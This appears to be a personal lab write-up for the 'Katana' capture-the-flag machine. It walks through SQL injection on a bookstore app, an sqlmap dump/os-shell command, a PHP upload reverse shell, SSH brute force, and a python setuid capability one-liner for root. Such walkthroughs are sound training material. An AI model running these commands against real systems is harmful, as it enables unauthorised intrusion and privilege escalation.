# Katana
We found the IP using `netdiscover`

> 192.168.1.113

## Port 80 - Apache

on port 80 there is a webserver running with `bookstore CSE`

![[Pasted image 20220626214753.png]]

`searchsploit` found a few exploits we can try.

![[Pasted image 20220626214929.png]]

Tested **EDB-48960** (login bypass via SQL injection) and it works exactly as described.

![[Pasted image 20220626215450.png]]

![[Pasted image 20220626215524.png]]

Tested **EDB-49314**  POC 1 which displays a SQL Syntax error. Proof that this exploit is applicable to this instance of CSE Bookstore.

![[Pasted image 20220626220205.png]]

SQLmap was able to dump the db, but I haven't been albe to get a shell with it.

```
sqlmap -u http://192.168.1.113/ebook/bookPerPub.php?pubid=4 -p 'pubid' --dbms=mariadb --dump --os-shell
```

Cracked the admin password

![[Pasted image 20220626220844.png]]

## Port  7080

**run gobuster to enum port 7080**

## Port 8088

Dirbuster found `phpinfo.php`

![[Pasted image 20220626231841.png]]

Dirbuster found `upload.html` where we were able to upload a php paypload that gave us a reverse shell as the `www-data` user.

Ran linpeas, which didn't find much. Looking at `/etc/passwd` we see the user `katana` has a hash in this file.

```
katana:$6$xHSuywb9JP8nPxSD$IdfUzMr6IAu3gAH0q7kdso5Xzh1DGjvoCtQ5Q2FPgjMRQcZ3BbsH.a35O1v8H.Cwj8.WDUdFD9Hmrnr2f2cun.:1000:1000:katana,,,:/home/katana:/bin/bash
```

## Initial access

By OSINT (cheating) we found we coudl brute force `katana`s ssh password. Which happened to be `root`

![[Pasted image 20220627002624.png]]

Once on the box we found a file in `/home/katana` called `.ssh_passwd`. The contents were
> katana@katana12345

We then discover the SSH password `root` is differenet from the linux password for katana `katana12345`.

## Privilege Escalation

Linpeas.sh finds capabilities on python

![[Pasted image 20220627003003.png]]

which is exploitable with the following command:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![[Pasted image 20220627003203.png]]

Found the root flag

![[Pasted image 20220627003248.png]]


